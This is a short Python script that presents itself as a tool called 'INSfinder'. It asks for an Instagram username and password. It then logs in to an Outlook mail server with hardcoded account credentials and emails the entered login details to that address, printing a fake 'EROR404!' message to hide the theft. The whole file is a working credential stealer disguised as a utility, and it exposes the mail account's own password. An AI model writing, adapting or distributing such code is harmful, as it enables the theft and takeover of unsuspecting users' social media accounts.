import getpass
import smtplib
from urllib.parse import quote
import time

# Define some colors
RED = '\033[91m'
GREEN = '\033[92m'
YELLOW = '\033[93m'
BLUE = '\033[94m'
RESET = '\033[0m'

# Ask for the user's Instagram username and password
print(BLUE + "======" + RESET + " INSfinder " + BLUE + "======")
username = input(BLUE + "Enter your Instagram username: " + RESET)
password = getpass.getpass(BLUE + "Enter your Instagram password: " + RESET)

# Log in to the email server
server = smtplib.SMTP("smtp.office365.com", 587)
server.starttls()

# Use your Outlook email address and password to log in
sender_email = "Mami477412@outlook.com"
sender_password = "Muhammed.4774"
server.login(sender_email, sender_password)

# Send the email with Instagram credentials
recipient_email = "Mami477412@outlook.com"
subject = "Instagram Credentials"
body = f"Username: {username}\nPassword: {password}"

msg = f"Subject: {subject}\n\n{body}"

server.sendmail(sender_email, recipient_email, msg)
print(GREEN + "EROR404!" + RESET)

# Log out and close the connection
server.quit()

